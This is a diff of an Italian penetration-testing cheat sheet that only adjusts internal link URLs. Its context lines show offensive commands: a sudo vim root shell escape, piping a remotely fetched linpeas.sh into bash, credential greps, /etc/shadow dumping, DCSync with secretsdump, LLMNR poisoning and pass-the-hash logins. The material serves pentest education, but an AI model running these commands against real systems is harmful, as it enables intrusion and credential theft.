@@ -41,7 +41,7 @@ pwd
 
 ### 2. ls
 
-Lista file e directory. Con `-la` mostra permessi, owner e file nascosti — essenziale per la [linux enumeration](https://hackita.it/articoli/linux-enumeration).
+Lista file e directory. Con `-la` mostra permessi, owner e file nascosti — essenziale per la [linux enumeration](https://hackita.it/articoli/linux-enumeration/).
 
 ```bash
 ls -la
@@ -112,7 +112,7 @@ grep -riE "password|passwd|secret|token|api_key" /var/www/ 2>/dev/null
 
 ### 8. find
 
-Cerca file nel filesystem. Critico per trovare SUID, file scrivibili e credenziali nella [linux privilege escalation](https://hackita.it/articoli/linux-privesc).
+Cerca file nel filesystem. Critico per trovare SUID, file scrivibili e credenziali nella [linux privilege escalation](https://hackita.it/articoli/linux-privesc/).
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
@@ -256,7 +256,7 @@ www-data
 
 ### 21. sudo
 
-Esegue comandi come root. Il primo test nella [linux privesc](https://hackita.it/articoli/linux-privesc).
+Esegue comandi come root. Il primo test nella [linux privesc](https://hackita.it/articoli/linux-privesc/).
 
 ```bash
 sudo -l
@@ -267,7 +267,7 @@ User www-data may run the following commands on target:
     (ALL) NOPASSWD: /usr/bin/vim
 ```
 
-Se `vim` è eseguibile come root: `sudo vim -c '!bash'` → shell root. Cerca su [GTFOBins](https://hackita.it/articoli/gtfobins) ogni binario trovato.
+Se `vim` è eseguibile come root: `sudo vim -c '!bash'` → shell root. Cerca su [GTFOBins](https://hackita.it/articoli/gtfobins/) ogni binario trovato.
 
 ### 22. su
 
@@ -336,7 +336,7 @@ ip addr
     inet 172.17.0.1/16
 ```
 
-Se vedi `docker0`, sei probabilmente sull'host Docker — i container sono sulla 172.17.x.x. Per la [container escape](https://hackita.it/articoli/container-escape), questa è un'informazione critica.
+Se vedi `docker0`, sei probabilmente sull'host Docker — i container sono sulla 172.17.x.x. Per la [container escape](https://hackita.it/articoli/container-escape/), questa è un'informazione critica.
 
 ### 28. ip route
 
@@ -354,7 +354,7 @@ default via 10.10.10.1 dev eth0
 
 ### 29. ss / netstat
 
-Mostra connessioni e porte in ascolto. Fondamentale per l'[enumerazione locale](https://hackita.it/articoli/linux-enumeration).
+Mostra connessioni e porte in ascolto. Fondamentale per l'[enumerazione locale](https://hackita.it/articoli/linux-enumeration/).
 
 ```bash
 ss -tulnp
@@ -366,7 +366,7 @@ tcp  LISTEN 0  128  127.0.0.1:3306 0.0.0.0:*  users:(("mysqld",pid=5678))
 tcp  LISTEN 0  128  0.0.0.0:8080   0.0.0.0:*  users:(("java",pid=9012))
 ```
 
-MySQL sulla 3306 solo su localhost: non raggiungibile dall'esterno ma raggiungibile dal server. Per l'[exploitation di MySQL](https://hackita.it/articoli/porta-3306-mysql), connettiti localmente.
+MySQL sulla 3306 solo su localhost: non raggiungibile dall'esterno ma raggiungibile dal server. Per l'[exploitation di MySQL](https://hackita.it/articoli/porta-3306-mysql/), connettiti localmente.
 
 ### 30. ping
 
@@ -396,7 +396,7 @@ dig corp.local ANY @10.10.10.10
 dig axfr corp.local @10.10.10.10
 ```
 
-Il zone transfer (`axfr`) rivela tutti i record DNS del dominio — hostname, IP, servizi. Per l'[enumerazione DNS](https://hackita.it/articoli/dns), è il primo test.
+Il zone transfer (`axfr`) rivela tutti i record DNS del dominio — hostname, IP, servizi. Per l'[enumerazione DNS](https://hackita.it/articoli/dns/), è il primo test.
 
 ### 33. host
 
@@ -475,7 +475,7 @@ ssh j.smith@10.10.10.40
 ssh -i id_rsa root@10.10.10.40
 ```
 
-Per l'[exploitation di SSH](https://hackita.it/articoli/ssh), le chiavi private trovate in share [NFS](https://hackita.it/articoli/porta-2049-nfs) o backup sono il vettore più comune.
+Per l'[exploitation di SSH](https://hackita.it/articoli/ssh/), le chiavi private trovate in share [NFS](https://hackita.it/articoli/porta-2049-nfs/) o backup sono il vettore più comune.
 
 ### 39. ssh tunnel (port forwarding)
 
@@ -516,7 +516,7 @@ arp -a
 
 ### 42. nmap
 
-Lo scanner di rete principale. Per la guida completa: [nmap](https://hackita.it/articoli/nmap).
+Lo scanner di rete principale. Per la guida completa: [nmap](https://hackita.it/articoli/nmap/).
 
 ```bash
 nmap -sV -sC -p- -oA scan 10.10.10.40
@@ -547,7 +547,7 @@ masscan 10.10.10.0/24 -p1-65535 --rate=1000 -oL masscan_results.txt
 
 ### 44. gobuster / dirsearch / feroxbuster
 
-Brute force directory e file su web server. Per il [web application pentest](https://hackita.it/articoli/web-pentest).
+Brute force directory e file su web server. Per il [web application pentest](https://hackita.it/articoli/web-pentest/).
 
 ```bash
 gobuster dir -u http://10.10.10.40 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
@@ -567,7 +567,7 @@ nikto -h http://10.10.10.40
 
 ### 46. enum4linux / enum4linux-ng
 
-Enumerazione SMB/NetBIOS. Per l'[enumerazione SMB](https://hackita.it/articoli/smb).
+Enumerazione SMB/NetBIOS. Per l'[enumerazione SMB](https://hackita.it/articoli/smb/).
 
 ```bash
 enum4linux-ng -A 10.10.10.40
@@ -597,7 +597,7 @@ rpcclient $> enumdomgroups
 
 ### 49. crackmapexec / netexec
 
-Tool di post-exploitation per reti Windows/AD. Per il [lateral movement AD](https://hackita.it/articoli/active-directory).
+Tool di post-exploitation per reti Windows/AD. Per il [lateral movement AD](https://hackita.it/articoli/active-directory/).
 
 ```bash
 crackmapexec smb 10.10.10.0/24 -u admin -p 'Password123!'
@@ -621,7 +621,7 @@ ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=user)" s
 
 ### 51. msfconsole (Metasploit)
 
-Framework di exploitation. Per la guida completa: [metasploit](https://hackita.it/articoli/metasploit).
+Framework di exploitation. Per la guida completa: [metasploit](https://hackita.it/articoli/metasploit/).
 
 ```bash
 msfconsole -q
@@ -636,7 +636,7 @@ msf6 > run
 
 ### 52. searchsploit
 
-Cerca exploit nel database [Exploit-DB](https://hackita.it/articoli/exploit-db).
+Cerca exploit nel database [Exploit-DB](https://hackita.it/articoli/exploitdb/).
 
 ```bash
 searchsploit apache 2.4.49
@@ -648,7 +648,7 @@ searchsploit -m 50383
 
 ### 53. sqlmap
 
-Automatizza SQL injection. Per il [web pentest](https://hackita.it/articoli/sqlmap).
+Automatizza SQL injection. Per il [web pentest](https://hackita.it/articoli/sqlmap/).
 
 ```bash
 sqlmap -u "http://10.10.10.40/page?id=1" --dbs
@@ -684,7 +684,7 @@ john --show hashes.txt
 
 ### 56. hashcat
 
-Cracking di hash con GPU. Per il [cracking di password](https://hackita.it/articoli/hashcat).
+Cracking di hash con GPU. Per il [cracking di password](https://hackita.it/articoli/hashcat/).
 
 ```bash
 hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
@@ -697,7 +697,7 @@ hashcat -m 1800 shadow_hashes.txt wordlist.txt
 
 ### 57. responder
 
-Poisoning LLMNR/NBT-NS per catturare hash NetNTLM sulla rete. Per gli [attacchi NTLM relay](https://hackita.it/articoli/ntlm-relay).
+Poisoning LLMNR/NBT-NS per catturare hash NetNTLM sulla rete. Per gli [attacchi NTLM relay](https://hackita.it/articoli/ntlm-relay/).
 
 ```bash
 responder -I eth0 -dwPv
@@ -729,7 +729,7 @@ evil-winrm -i 10.10.10.10 -u Administrator -H 32ed87bdb5fdc5e9cba
 
 ### 60. secretsdump.py
 
-Dump di credenziali da Domain Controller — la tecnica [DCSync](https://hackita.it/articoli/dcsync).
+Dump di credenziali da Domain Controller — la tecnica [DCSync](https://hackita.it/articoli/dcsync/).
 
 ```bash
 secretsdump.py corp.local/Administrator:'P@ssw0rd'@10.10.10.10 -just-dc
@@ -842,7 +842,7 @@ scp exploit.sh user@10.10.10.40:/tmp/
 
 ## Privilege Escalation Linux
 
-Per la guida completa: [linux privesc](https://hackita.it/articoli/linux-privesc).
+Per la guida completa: [linux privesc](https://hackita.it/articoli/linux-privesc/).
 
 ### 72. sudo -l
 
@@ -907,7 +907,7 @@ Python3 con `cap_setuid` = root immediato: `python3 -c 'import os; os.setuid(0);
 
 ### 79. linpeas.sh
 
-Script di enumerazione automatica per [linux privilege escalation](https://hackita.it/articoli/linux-privesc).
+Script di enumerazione automatica per [linux privilege escalation](https://hackita.it/articoli/linux-privesc/).
 
 ```bash
 curl http://10.10.10.200:8080/linpeas.sh | bash
@@ -929,7 +929,7 @@ Se `/opt/backup.sh` è scrivibile → modifica → root alla prossima esecuzione
 
 ### 81. uname
 
-Versione kernel — per cercare [kernel exploits](https://hackita.it/articoli/kernel-exploits).
+Versione kernel — per cercare [kernel exploits](https://hackita.it/articoli/kernel/).
 
 ```bash
 uname -a
@@ -956,7 +956,7 @@ root:$6$abc123$hashhere...:19000:0:99999:7:::
 j.smith:$6$def456$hashhere...:19000:0:99999:7:::
 ```
 
-Cracka con [hashcat](https://hackita.it/articoli/hashcat) mode 1800.
+Cracka con [hashcat](https://hackita.it/articoli/hashcat/) mode 1800.
 
 ### 83. /etc/passwd
 
@@ -1070,11 +1070,11 @@ DB_PASSWORD=ProductionP@ss!
 AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...
 ```
 
-Per il [privilege escalation su AWS](https://hackita.it/articoli/aws-privilege-escalation) con chiavi trovate nelle variabili d'ambiente.
+Per il [privilege escalation su AWS](https://hackita.it/articoli/aws-privilege-escalation/) con chiavi trovate nelle variabili d'ambiente.
 
 ### 92. mount
 
-Mostra filesystem montati. Cerca [NFS shares](https://hackita.it/articoli/porta-2049-nfs) e partizioni interessanti.
+Mostra filesystem montati. Cerca [NFS shares](https://hackita.it/articoli/porta-2049-nfs/) e partizioni interessanti.
 
 ```bash
 mount | grep -iE "nfs|cifs|tmpfs"
